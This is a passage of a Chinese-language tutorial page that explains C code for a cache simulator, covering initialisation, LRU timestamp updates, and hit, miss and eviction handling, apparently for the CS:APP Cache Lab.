<span class=normal><a href=#__codelineno-120-17>17</a></span>
<span class=normal><a href=#__codelineno-120-18>18</a></span>
<span class=normal><a href=#__codelineno-120-19>19</a></span>
<span class=normal><a href=#__codelineno-120-20>20</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-120-1><a id=__codelineno-120-1 name=__codelineno-120-1></a><span class=kt>void</span><span class=w> </span><span class=nf>Init_Cache</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>E</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>b</span><span class=p>)</span>
</span><span id=__span-120-2><a id=__codelineno-120-2 name=__codelineno-120-2></a><span class=p>{</span>
</span><span id=__span-120-3><a id=__codelineno-120-3 name=__codelineno-120-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>S</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=n>s</span><span class=p>;</span>
</span><span id=__span-120-4><a id=__codelineno-120-4 name=__codelineno-120-4></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>B</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=n>b</span><span class=p>;</span>
</span><span id=__span-120-5><a id=__codelineno-120-5 name=__codelineno-120-5></a><span class=w>    </span><span class=n>cache</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Cache</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>Cache</span><span class=p>));</span>
</span><span id=__span-120-6><a id=__codelineno-120-6 name=__codelineno-120-6></a><span class=w>    </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>S</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>S</span><span class=p>;</span>
</span><span id=__span-120-7><a id=__codelineno-120-7 name=__codelineno-120-7></a><span class=w>    </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>E</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>E</span><span class=p>;</span>
</span><span id=__span-120-8><a id=__codelineno-120-8 name=__codelineno-120-8></a><span class=w>    </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>B</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>B</span><span class=p>;</span>
</span><span id=__span-120-9><a id=__codelineno-120-9 name=__codelineno-120-9></a><span class=w>    </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Cache_line</span><span class=w> </span><span class=o>**</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>Cache_line</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>S</span><span class=p>);</span>
</span><span id=__span-120-10><a id=__codelineno-120-10 name=__codelineno-120-10></a><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>S</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-120-11><a id=__codelineno-120-11 name=__codelineno-120-11></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-120-12><a id=__codelineno-120-12 name=__codelineno-120-12></a><span class=w>        </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Cache_line</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>Cache_line</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>E</span><span class=p>);</span>
</span><span id=__span-120-13><a id=__codelineno-120-13 name=__codelineno-120-13></a><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>E</span><span class=p>;</span><span class=w> </span><span class=n>j</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-120-14><a id=__codelineno-120-14 name=__codelineno-120-14></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-120-15><a id=__codelineno-120-15 name=__codelineno-120-15></a><span class=w>            </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>].</span><span class=n>valid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w>     </span><span class=c1>// 初始时，高速缓存是空的</span>
</span><span id=__span-120-16><a id=__codelineno-120-16 name=__codelineno-120-16></a><span class=w>            </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>].</span><span class=n>tag</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>-1</span><span class=p>;</span>
</span><span id=__span-120-17><a id=__codelineno-120-17 name=__codelineno-120-17></a><span class=w>            </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>].</span><span class=n>time_tamp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-120-18><a id=__codelineno-120-18 name=__codelineno-120-18></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-120-19><a id=__codelineno-120-19 name=__codelineno-120-19></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-120-20><a id=__codelineno-120-20 name=__codelineno-120-20></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <h4 id=lru>LRU 时间戳实现<a class=headerlink href=#lru title="Permanent link">¶</a></h4> <p>时间戳越大则表示该行最后访问的时间越久远，因此 LRU 更新代码为如下：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-121-1> 1</a></span>
<span class=normal><a href=#__codelineno-121-2> 2</a></span>
<span class=normal><a href=#__codelineno-121-3> 3</a></span>
<span class=normal><a href=#__codelineno-121-4> 4</a></span>
<span class=normal><a href=#__codelineno-121-5> 5</a></span>
<span class=normal><a href=#__codelineno-121-6> 6</a></span>
<span class=normal><a href=#__codelineno-121-7> 7</a></span>
<span class=normal><a href=#__codelineno-121-8> 8</a></span>
<span class=normal><a href=#__codelineno-121-9> 9</a></span>
<span class=normal><a href=#__codelineno-121-10>10</a></span>
<span class=normal><a href=#__codelineno-121-11>11</a></span>
<span class=normal><a href=#__codelineno-121-12>12</a></span>
<span class=normal><a href=#__codelineno-121-13>13</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-121-1><a id=__codelineno-121-1 name=__codelineno-121-1></a><span class=kt>void</span><span class=w> </span><span class=nf>update</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>op_s</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>op_tag</span><span class=p>)</span>
</span><span id=__span-121-2><a id=__codelineno-121-2 name=__codelineno-121-2></a><span class=p>{</span>
</span><span id=__span-121-3><a id=__codelineno-121-3 name=__codelineno-121-3></a><span class=w>    </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=p>[</span><span class=n>op_s</span><span class=p>][</span><span class=n>i</span><span class=p>].</span><span class=n>valid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-121-4><a id=__codelineno-121-4 name=__codelineno-121-4></a><span class=w>    </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=p>[</span><span class=n>op_s</span><span class=p>][</span><span class=n>i</span><span class=p>].</span><span class=n>tag</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>op_tag</span><span class=p>;</span>
</span><span id=__span-121-5><a id=__codelineno-121-5 name=__codelineno-121-5></a><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>E</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-121-6><a id=__codelineno-121-6 name=__codelineno-121-6></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-121-7><a id=__codelineno-121-7 name=__codelineno-121-7></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=p>[</span><span class=n>op_s</span><span class=p>][</span><span class=n>k</span><span class=p>].</span><span class=n>valid</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>1</span><span class=p>)</span>
</span><span id=__span-121-8><a id=__codelineno-121-8 name=__codelineno-121-8></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-121-9><a id=__codelineno-121-9 name=__codelineno-121-9></a><span class=w>            </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=p>[</span><span class=n>op_s</span><span class=p>][</span><span class=n>k</span><span class=p>].</span><span class=n>time_tamp</span><span class=o>++</span><span class=p>;</span>
</span><span id=__span-121-10><a id=__codelineno-121-10 name=__codelineno-121-10></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-121-11><a id=__codelineno-121-11 name=__codelineno-121-11></a><span class=w>    </span><span class=p>}</span><span class=w>    </span>
</span><span id=__span-121-12><a id=__codelineno-121-12 name=__codelineno-121-12></a><span class=w>    </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=p>[</span><span class=n>op_s</span><span class=p>][</span><span class=n>i</span><span class=p>].</span><span class=n>time_tamp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-121-13><a id=__codelineno-121-13 name=__codelineno-121-13></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>这段代码在找到要操作的行后调用（无论是不命中还是命中，还是驱逐后）。前两行是对有效位和标志位的设置，与时间戳无关，主要关注后几行：</p> <ul> <li>遍历组中每一行，并将它们的值加1，也就是说每一行在进行一次操作后时间戳都会变大，表示它离最后操作的时间变久</li> <li>将本次操作的行时间戳设置为最小，也就是0</li> </ul> <p>因此，每次只需要找到时间戳最大的行进行替换就可以了：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-122-1> 1</a></span>
<span class=normal><a href=#__codelineno-122-2> 2</a></span>
<span class=normal><a href=#__codelineno-122-3> 3</a></span>
<span class=normal><a href=#__codelineno-122-4> 4</a></span>
<span class=normal><a href=#__codelineno-122-5> 5</a></span>
<span class=normal><a href=#__codelineno-122-6> 6</a></span>
<span class=normal><a href=#__codelineno-122-7> 7</a></span>
<span class=normal><a href=#__codelineno-122-8> 8</a></span>
<span class=normal><a href=#__codelineno-122-9> 9</a></span>
<span class=normal><a href=#__codelineno-122-10>10</a></span>
<span class=normal><a href=#__codelineno-122-11>11</a></span>
<span class=normal><a href=#__codelineno-122-12>12</a></span>
<span class=normal><a href=#__codelineno-122-13>13</a></span>
<span class=normal><a href=#__codelineno-122-14>14</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-122-1><a id=__codelineno-122-1 name=__codelineno-122-1></a><span class=kt>int</span><span class=w> </span><span class=nf>find_LRU</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>op_s</span><span class=p>)</span>
</span><span id=__span-122-2><a id=__codelineno-122-2 name=__codelineno-122-2></a><span class=p>{</span>
</span><span id=__span-122-3><a id=__codelineno-122-3 name=__codelineno-122-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>max_index</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-122-4><a id=__codelineno-122-4 name=__codelineno-122-4></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>max_stamp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-122-5><a id=__codelineno-122-5 name=__codelineno-122-5></a><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>E</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-122-6><a id=__codelineno-122-6 name=__codelineno-122-6></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-122-7><a id=__codelineno-122-7 name=__codelineno-122-7></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=p>[</span><span class=n>op_s</span><span class=p>][</span><span class=n>i</span><span class=p>].</span><span class=n>time_tamp</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>max_stamp</span><span class=p>)</span>
</span><span id=__span-122-8><a id=__codelineno-122-8 name=__codelineno-122-8></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-122-9><a id=__codelineno-122-9 name=__codelineno-122-9></a><span class=w>            </span><span class=n>max_stamp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=p>[</span><span class=n>op_s</span><span class=p>][</span><span class=n>i</span><span class=p>].</span><span class=n>time_tamp</span><span class=p>;</span>
</span><span id=__span-122-10><a id=__codelineno-122-10 name=__codelineno-122-10></a><span class=w>            </span><span class=n>max_index</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=p>;</span>
</span><span id=__span-122-11><a id=__codelineno-122-11 name=__codelineno-122-11></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-122-12><a id=__codelineno-122-12 name=__codelineno-122-12></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-122-13><a id=__codelineno-122-13 name=__codelineno-122-13></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>max_index</span><span class=p>;</span>
</span><span id=__span-122-14><a id=__codelineno-122-14 name=__codelineno-122-14></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <h4 id=_9>缓存搜索及更新<a class=headerlink href=#_9 title="Permanent link">¶</a></h4> <p>先解决比较核心的问题，在得知要操作的组<code>op_s</code>以及标志位<code>op_tag</code>后，判断是<code>miss</code>还是<code>hit</code>还是应该<code>eviction</code>并调用<code>find_LRU</code>。</p> <p>先判断是<code>miss</code>还是<code>hit</code>：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-123-1> 1</a></span>
<span class=normal><a href=#__codelineno-123-2> 2</a></span>
<span class=normal><a href=#__codelineno-123-3> 3</a></span>
<span class=normal><a href=#__codelineno-123-4> 4</a></span>
<span class=normal><a href=#__codelineno-123-5> 5</a></span>
<span class=normal><a href=#__codelineno-123-6> 6</a></span>
<span class=normal><a href=#__codelineno-123-7> 7</a></span>
<span class=normal><a href=#__codelineno-123-8> 8</a></span>
<span class=normal><a href=#__codelineno-123-9> 9</a></span>
<span class=normal><a href=#__codelineno-123-10>10</a></span>
<span class=normal><a href=#__codelineno-123-11>11</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-123-1><a id=__codelineno-123-1 name=__codelineno-123-1></a><span class=kt>int</span><span class=w> </span><span class=nf>get_index</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>op_s</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>op_tag</span><span class=p>)</span>
</span><span id=__span-123-2><a id=__codelineno-123-2 name=__codelineno-123-2></a><span class=p>{</span>
</span><span id=__span-123-3><a id=__codelineno-123-3 name=__codelineno-123-3></a><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>E</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-123-4><a id=__codelineno-123-4 name=__codelineno-123-4></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-123-5><a id=__codelineno-123-5 name=__codelineno-123-5></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=p>[</span><span class=n>op_s</span><span class=p>][</span><span class=n>i</span><span class=p>].</span><span class=n>valid</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=p>[</span><span class=n>op_s</span><span class=p>][</span><span class=n>i</span><span class=p>].</span><span class=n>tag</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>op_tag</span><span class=p>)</span>
</span><span id=__span-123-6><a id=__codelineno-123-6 name=__codelineno-123-6></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-123-7><a id=__codelineno-123-7 name=__codelineno-123-7></a><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>i</span><span class=p>;</span>
</span><span id=__span-123-8><a id=__codelineno-123-8 name=__codelineno-123-8></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-123-9><a id=__codelineno-123-9 name=__codelineno-123-9></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-123-10><a id=__codelineno-123-10 name=__codelineno-123-10></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>-1</span><span class=p>;</span>
</span><span id=__span-123-11><a id=__codelineno-123-11 name=__codelineno-123-11></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>遍历所有行，如果某一行有效，且标志位相同，则<code>hit</code>，返回该索引。否则，<code>miss</code>，返回 -1。当接收到-1后，有两种情况：</p> <ul> <li>冷不命中。组中有空行，只不过还未操作过，有效位为0，找到这个空行即可</li> <li>所有行都满了。那么就要用到上面得 LRU 进行选择<code>eviction</code>驱逐</li> </ul> <p>所以，设计一个判满的函数：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-124-1> 1</a></span>
<span class=normal><a href=#__codelineno-124-2> 2</a></span>
<span class=normal><a href=#__codelineno-124-3> 3</a></span>
<span class=normal><a href=#__codelineno-124-4> 4</a></span>
<span class=normal><a href=#__codelineno-124-5> 5</a></span>
<span class=normal><a href=#__codelineno-124-6> 6</a></span>
<span class=normal><a href=#__codelineno-124-7> 7</a></span>
<span class=normal><a href=#__codelineno-124-8> 8</a></span>
<span class=normal><a href=#__codelineno-124-9> 9</a></span>
<span class=normal><a href=#__codelineno-124-10>10</a></span>
<span class=normal><a href=#__codelineno-124-11>11</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-124-1><a id=__codelineno-124-1 name=__codelineno-124-1></a><span class=kt>int</span><span class=w> </span><span class=nf>is_full</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>op_s</span><span class=p>)</span>
</span><span id=__span-124-2><a id=__codelineno-124-2 name=__codelineno-124-2></a><span class=p>{</span>
</span><span id=__span-124-3><a id=__codelineno-124-3 name=__codelineno-124-3></a><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>E</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-124-4><a id=__codelineno-124-4 name=__codelineno-124-4></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-124-5><a id=__codelineno-124-5 name=__codelineno-124-5></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cache</span><span class=o>-&gt;</span><span class=n>line</span><span class=p>[</span><span class=n>op_s</span><span class=p>][</span><span class=n>i</span><span class=p>].</span><span class=n>valid</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-124-6><a id=__codelineno-124-6 name=__codelineno-124-6></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-124-7><a id=__codelineno-124-7 name=__codelineno-124-7></a><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>i</span><span class=p>;</span>
</span><span id=__span-124-8><a id=__codelineno-124-8 name=__codelineno-124-8></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-124-9><a id=__codelineno-124-9 name=__codelineno-124-9></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-124-10><a id=__codelineno-124-10 name=__codelineno-124-10></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>-1</span><span class=p>;</span>
</span><span id=__span-124-11><a id=__codelineno-124-11 name=__codelineno-124-11></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>扫描完成后，得到对应行的索引值，就可以调用 LRU 更新函数进行更新了。整体调用如下：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-125-1> 1</a></span>
<span class=normal><a href=#__codelineno-125-2> 2</a></span>
<span class=normal><a href=#__codelineno-125-3> 3</a></span>
<span class=normal><a href=#__codelineno-125-4> 4</a></span>
<span class=normal><a href=#__codelineno-125-5> 5</a></span>
<span class=normal><a href=#__codelineno-125-6> 6</a></span>
<span class=normal><a href=#__codelineno-125-7> 7</a></span>
<span class=normal><a href=#__codelineno-125-8> 8</a></span>
<span class=normal><a href=#__codelineno-125-9> 9</a></span>
<span class=normal><a href=#__codelineno-125-10>10</a></span>
<span class=normal><a href=#__codelineno-125-11>11</a></span>
<span class=normal><a href=#__codelineno-125-12>12</a></span>
<span class=normal><a href=#__codelineno-125-13>13</a></span>
<span class=normal><a href=#__codelineno-125-14>14</a></span>
<span class=normal><a href=#__codelineno-125-15>15</a></span>
<span class=normal><a href=#__codelineno-125-16>16</a></span>
<span class=normal><a href=#__codelineno-125-17>17</a></span>
<span class=normal><a href=#__codelineno-125-18>18</a></span>
<span class=normal><a href=#__codelineno-125-19>19</a></span>
<span class=normal><a href=#__codelineno-125-20>20</a></span>
<span class=normal><a href=#__codelineno-125-21>21</a></span>
<span class=normal><a href=#__codelineno-125-22>22</a></span>
<span class=normal><a href=#__codelineno-125-23>23</a></span>
<span class=normal><a href=#__codelineno-125-24>24</a></span>
<span class=normal><a href=#__codelineno-125-25>25</a></span>
<span class=normal><a href=#__codelineno-125-26>26</a></span>
<span class=normal><a href=#__codelineno-125-27>27</a></span>
<span class=normal><a href=#__codelineno-125-28>28</a></span>
<span class=normal><a href=#__codelineno-125-29>29</a></span>
<span class=normal><a href=#__codelineno-125-30>30</a></span>
<span class=normal><a href=#__codelineno-125-31>31</a></span>
<span class=normal><a href=#__codelineno-125-32>32</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-125-1><a id=__codelineno-125-1 name=__codelineno-125-1></a><span class=kt>void</span><span class=w> </span><span class=nf>update_info</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>op_tag</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>op_s</span><span class=p>)</span>
</span><span id=__span-125-2><a id=__codelineno-125-2 name=__codelineno-125-2></a><span class=p>{</span>
</span><span id=__span-125-3><a id=__codelineno-125-3 name=__codelineno-125-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>index</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>get_index</span><span class=p>(</span><span class=n>op_s</span><span class=p>,</span><span class=w> </span><span class=n>op_tag</span><span class=p>);</span>
</span><span id=__span-125-4><a id=__codelineno-125-4 name=__codelineno-125-4></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>index</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>-1</span><span class=p>)</span><span class=w>                </span><span class=c1>// miss</span>
</span><span id=__span-125-5><a id=__codelineno-125-5 name=__codelineno-125-5></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-125-6><a id=__codelineno-125-6 name=__codelineno-125-6></a><span class=w>        </span><span class=n>miss_count</span><span class=o>++</span><span class=p>;</span>
</span><span id=__span-125-7><a id=__codelineno-125-7 name=__codelineno-125-7></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>verbose</span><span class=p>)</span>
</span><span id=__span-125-8><a id=__codelineno-125-8 name=__codelineno-125-8></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-125-9><a id=__codelineno-125-9 name=__codelineno-125-9></a><span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=s>"miss"</span><span class=p>);</span>
</span><span id=__span-125-10><a id=__codelineno-125-10 name=__codelineno-125-10></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-125-11><a id=__codelineno-125-11 name=__codelineno-125-11></a><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>is_full</span><span class=p>(</span><span class=n>op_s</span><span class=p>);</span>
</span><span id=__span-125-12><a id=__codelineno-125-12 name=__codelineno-125-12></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>-1</span><span class=p>)</span><span class=w>                </span><span class=c1>// 所有行都满了，需要eviction</span>
</span><span id=__span-125-13><a id=__codelineno-125-13 name=__codelineno-125-13></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-125-14><a id=__codelineno-125-14 name=__codelineno-125-14></a><span class=w>            </span><span class=n>eviction_count</span><span class=o>++</span><span class=p>;</span>
</span><span id=__span-125-15><a id=__codelineno-125-15 name=__codelineno-125-15></a><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>verbose</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-125-16><a id=__codelineno-125-16 name=__codelineno-125-16></a><span class=w>            </span><span class=p>{</span>
</span><span id=__span-125-17><a id=__codelineno-125-17 name=__codelineno-125-17></a><span class=w>                </span><span class=n>printf</span><span class=p>(</span><span class=s>"eviction"</span><span class=p>);</span>
</span><span id=__span-125-18><a id=__codelineno-125-18 name=__codelineno-125-18></a><span class=w>            </span><span class=p>}</span>
</span><span id=__span-125-19><a id=__codelineno-125-19 name=__codelineno-125-19></a><span class=w>            </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>find_LRU</span><span class=p>(</span><span class=n>op_s</span><span class=p>);</span><span class=w>     </span><span class=c1>// 替换时间戳最大的那个行</span>
</span><span id=__span-125-20><a id=__codelineno-125-20 name=__codelineno-125-20></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-125-21><a id=__codelineno-125-21 name=__codelineno-125-21></a><span class=w>        </span><span class=n>update</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=n>op_s</span><span class=p>,</span><span class=w> </span><span class=n>op_tag</span><span class=p>);</span>
</span><span id=__span-125-22><a id=__codelineno-125-22 name=__codelineno-125-22></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-125-23><a id=__codelineno-125-23 name=__codelineno-125-23></a><span class=w>    </span><span class=k>else</span><span class=w>                            </span><span class=c1>// hit</span>
</span><span id=__span-125-24><a id=__codelineno-125-24 name=__codelineno-125-24></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-125-25><a id=__codelineno-125-25 name=__codelineno-125-25></a><span class=w>        </span><span class=n>hit_count</span><span class=o>++</span><span class=p>;</span>
</span><span id=__span-125-26><a id=__codelineno-125-26 name=__codelineno-125-26></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>verbose</span><span class=p>)</span>
</span><span id=__span-125-27><a id=__codelineno-125-27 name=__codelineno-125-27></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-125-28><a id=__codelineno-125-28 name=__codelineno-125-28></a><span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=s>"hit"</span><span class=p>);</span>
